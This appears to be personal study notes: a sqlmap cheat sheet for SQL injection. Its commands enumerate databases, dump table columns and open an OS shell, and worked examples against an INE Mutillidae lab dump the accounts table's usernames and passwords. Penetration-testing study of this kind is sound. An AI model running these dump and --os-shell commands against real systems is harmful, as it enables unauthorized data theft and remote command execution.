[sqlmap usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
[sqlmap usage2](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-with-sqlmap/)

```bash
$ sqlmap -u "http://localhost:8081/?id=1"
/usr/share/sqlmap/output/... # output file 
$ sqlmap -r <request_file> [-p <parameter>] --os-shell  [--web-root "/var/www/html/tmp"] [--force-ssl] # when ssl
```

```bash
$ sqlmap -r <request_file> # Load HTTP request from a file
$ sqlmap -u <addres> --data='<data=data&data1=data1>' # POST request
```
```bash
$ sqlmap -u <URL> --is-dba # check if database user is administrator
$ sqlmap -u <URL> --users # database users
$ sqlmap -u <URL> --dbs # list all available databases
$ sqlmap -u <URL> --tables  # list tables in all databases
$ sqlmap -u <URL> -D <database> --tables  # list tables in database
$ sqlmap -u <URL> -D <database> -T <table> --columns # list colummns in db
$ sqlmap -u <URL> -D <database> -T <table> -C <columns> --dump # dump columns values

$ sqlmap -u <URL> --dbms=<database_type> # provide the web application's back-end database

$ sqlmap ... -p <parameter_to_test>
$ sqlmap -u <URL> --flush-session # flush session files for current target
$ sqlmap -u <URL> --batch # Never ask for user input, use the default behavior
$ sqlmap -u <URL> --banner # database banner grab
```
```bash
# to retrieve info about the database
--hostname
--current-user
--current-db
--dbs
```
```bash
--string "string" # string which is always be present in true output pages
--not-string "string" # string which is always be present in false output pages
$ sqlmap -r <request_file> --os-shell # run arbitrary commands on the database server's underlying operating system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server
```

```bash
sqlmap -u "http://demo.ine.local/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" --cookie "PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1" -p username --dbs
```
```bash
sqlmap -u "http://demo.ine.local/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" --cookie "PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1" -p username --dbs -D mutillidae --tables
```
```bash
sqlmap -u "http://demo.ine.local/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" --cookie "PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1" -p username --dbs -D mutillidae --tables -T accounts -C username,password,is_admin --dump
```
```bash
sqlmap -u "http://demo.ine.local/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" --cookie "PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1" -p username --os-shell
```
# proxy for sqlmap

[[proxy-serwer-http]]
[[proxy-serwer-ws]]
